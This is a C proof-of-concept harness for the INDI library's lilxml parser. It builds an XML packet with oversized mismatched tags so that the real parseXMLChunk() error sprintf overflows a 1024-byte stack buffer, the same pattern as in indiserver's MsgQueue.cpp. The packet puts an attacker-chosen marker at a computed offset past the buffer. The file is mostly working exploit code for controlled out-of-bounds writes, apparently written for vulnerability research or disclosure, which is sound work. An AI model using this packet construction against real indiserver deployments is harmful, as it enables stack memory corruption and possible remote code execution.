// Driver for the verbatim pinned upstream libs/indicore/lilxml.cpp.
// Calls the REAL parseXMLChunk() -> oneXMLchar() with a 1024-byte caller
// error buffer, matching indiserver/MsgQueue.cpp:525-526.  No production
// function is reimplemented.  The captured "victim" region is a harness
// stack object placed immediately after err[] purely to observe the bytes
// the upstream sprintf() writes; rung 4 stays INSTRUMENTED.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "lilxml.h"

static const char CHOSEN[] = "INDI2SHELL";

// packet: <A...A[chosen]>x</B...B>  (mismatched tags, both attacker-sized)
static void build_packet(char *buf, int taglen, int chosen_at, int *out_len)
{
    int p = 0;
    size_t clen = strlen(CHOSEN);
    buf[p++] = '<';
    for (int i = 0; i < taglen; i++)
    {
        if (i >= chosen_at && (size_t)(i - chosen_at) < clen)
            buf[p++] = CHOSEN[i - chosen_at];
        else
            buf[p++] = 'A';
    }
    buf[p++] = '>';
    buf[p++] = 'x';
    buf[p++] = '<';
    buf[p++] = '/';
    for (int i = 0; i < taglen; i++)
        buf[p++] = 'B';
    buf[p++] = '>';
    buf[p] = 0;
    *out_len = p;
}

// capture mode: err[1024] followed by a harness tail that records the bytes
// the upstream sprintf writes past err.  Plain (non-ASan) build.
static void run_capture(LilXML *lp, char *buf, int nr, int victim_off)
{
    struct Frame
    {
        char err[1024];
        char tail[512];
    } f;
    memset(&f, 0, sizeof(f));
    XMLEle **nodes = parseXMLChunk(lp, buf, nr, f.err);
    int first = -1;
    for (int i = 0; i < 512; i++)
        if (f.tail[i])
        {
            first = i;
            break;
        }
    size_t clen = strlen(CHOSEN);
    int found = -1;
    for (int i = 0; i + (int)clen <= 512; i++)
        if (!memcmp(f.tail + i, CHOSEN, clen))
        {
            found = i;
            break;
        }
    printf("CAPTURE nodes=%s first_changed=%d\n", nodes ? "nonnull" : "null", first);
    printf("VICTIM requested_offset=%d chosen_offset=%d chosen_bytes=%s supplied=%s\n",
           victim_off, found, found >= 0 ? CHOSEN : "", CHOSEN);
}

// ASan mode: a standalone stack buffer so the sanitizer instruments it with
// redzones and reports the write past err[1024] at the real upstream line.
static void run_asan(LilXML *lp, char *buf, int nr)
{
    char err[1024];
    memset(err, 0, sizeof(err));
    XMLEle **nodes = parseXMLChunk(lp, buf, nr, err);
    printf("ASAN nodes=%s err0=%d supplied_marker=%s\n",
           nodes ? "nonnull" : "null", err[0], CHOSEN);
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "capture";
    int taglen = argc > 2 ? atoi(argv[2]) : 600;
    int victim_off = argc > 3 ? atoi(argv[3]) : 0;
    char buf[8192];
    int nr = 0;
    const int err_size = 1024;
    const int prefix = 20;  // "Line 1: closing tag "
    const int mid = 16;     // " does not match "
    int open_off = prefix + taglen + mid;
    int chosen_at = err_size - open_off + victim_off;
    int errlen = prefix + 2 * taglen + mid + 1;  // + NUL
    build_packet(buf, taglen, chosen_at, &nr);
    printf("PACKET len=%d taglen=%d open_off=%d chosen_at=%d victim_off=%d err_size=%d expected_errlen=%d expected_oob=%d\n",
           nr, taglen, open_off, chosen_at, victim_off, err_size, errlen, errlen - err_size);
    LilXML *lp = newLilXML();
    if (!strcmp(mode, "asan"))
        run_asan(lp, buf, nr);
    else
        run_capture(lp, buf, nr, victim_off);
    delLilXML(lp);
    return 0;
}
